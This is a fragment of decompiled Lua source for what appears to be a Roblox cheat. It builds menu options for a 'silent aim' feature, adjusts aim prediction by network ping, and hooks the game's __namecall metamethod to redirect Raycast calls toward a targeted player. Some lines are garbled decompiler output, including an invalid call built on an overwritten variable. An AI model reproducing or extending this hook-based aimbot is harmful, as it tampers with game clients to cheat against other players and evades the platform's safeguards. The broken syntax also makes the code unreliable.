  Min = 0.165,
  Max = 1,
  Increment = 0.001,
  Default = r96_0.SA.MHP_A,
  Callback = function(r0)
    -- line: [0, 0] id: 28
    r96_0.SA.MHP_A = r0
  end,
})
r95:AddSection({
  Name = "Visuals",
})
r95:AddToggle({
  Name = "Show Silent Aim Target",
  Default = r96_0.SA.Show,
  Callback = function(r0)
    -- line: [0, 0] id: 192
    r96_0.SA.Show = r0
    r96_0.MBX.Visible = r0
  end,
})
r109 = "AddColorpicker"
r109 = {
  Name = "Silent Aim Target Color",
  Default = r96_0.SA.Col,
  Callback = function(r0)
    -- line: [0, 0] id: 49
    r96_0.SA.Col = r0
    r96_0.MBX.Color = r0
  end,
}
r95:[r109](r109)
r104:Connect(function()
  -- line: [0, 0] id: 22
  if r96_0.SA.AP then
    local r0, r1 = pcall(function()
      -- line: [0, 0] id: 23
      return r96_0.ST.Network.ServerStatsItem["Data Ping"]:GetValueString()
    end)
    if r0 then
      local r2 = tonumber(r1:match("(%d+)")) or 50
      if r2 < 20 then
        r96_0.CPA = 0.11
      elseif r2 < 30 then
        r96_0.CPA = 0.115
      elseif r2 < 40 then
        r96_0.CPA = 0.12
      elseif r2 < 50 then
        r96_0.CPA = 0.125
      elseif r2 < 60 then
        r96_0.CPA = 0.13
      elseif r2 < 70 then
        r96_0.CPA = 0.135
      elseif r2 < 80 then
        r96_0.CPA = 0.14
      elseif r2 < 90 then
        r96_0.CPA = 0.145
      elseif r2 < 100 then
        r96_0.CPA = 0.15
      elseif r2 < 110 then
        r96_0.CPA = 0.155
      else
        r96_0.CPA = 0.16
      end
    end
  else
    r96_0.CPA = r96_0.SA.MHP_A
  end
end)
r103:Connect(function()
  -- line: [0, 0] id: 41
  if r96_0.SA.Show and r96_0.SA.En and r97_0 then
    if GCP() then
      local r1, r2 = r101_0(r96_0.Cam, (GCP().Parent.PrimaryPart or GCP()).Position)
      r96_0.MBX.Visible = r2
      r96_0.MBX.Position = Vector2.new(r1.X, r1.Y)
    else
      r96_0.MBX.Visible = false
      r96_0.MBX.Position = Vector2.new()
    end
  end
end)
local r107_0 = checkcaller or function()
  -- line: [0, 0] id: 101
  return false
end
local r108_0 = newcclosure or function(r0)
  -- line: [0, 0] id: 182
  return r0
end
r109_0 = false
if hookmetamethod then
  local r110, r111 = pcall(function()
    -- line: [0, 0] id: 52
    oldNC = hookmetamethod(game, "__namecall", r108_0(function(...)
      -- line: [0, 0] id: 53
      local r1 = getnamecallmethod()
      local r2 = {
        ...
      }
      local r3 = r2[1]
      local r4 = Ch(r96_0.SA.HC)
      if r96_0.SA.En and r3 == r24_0 and not r107_0() and r4 and r1 == "Raycast" and VA(r2, r96_0.EA.Raycast) then
        local r5 = r2[2]
        local r6 = GCP()
        if r6 then
          r2[3] = GD(r5, GPP(r6))
          return oldNC(unpack(r2))
        end
      end
      return oldNC(...)
    end))
    r109_0 = true
  end)
  if not r110 then
  end
end
r31_0:Init()
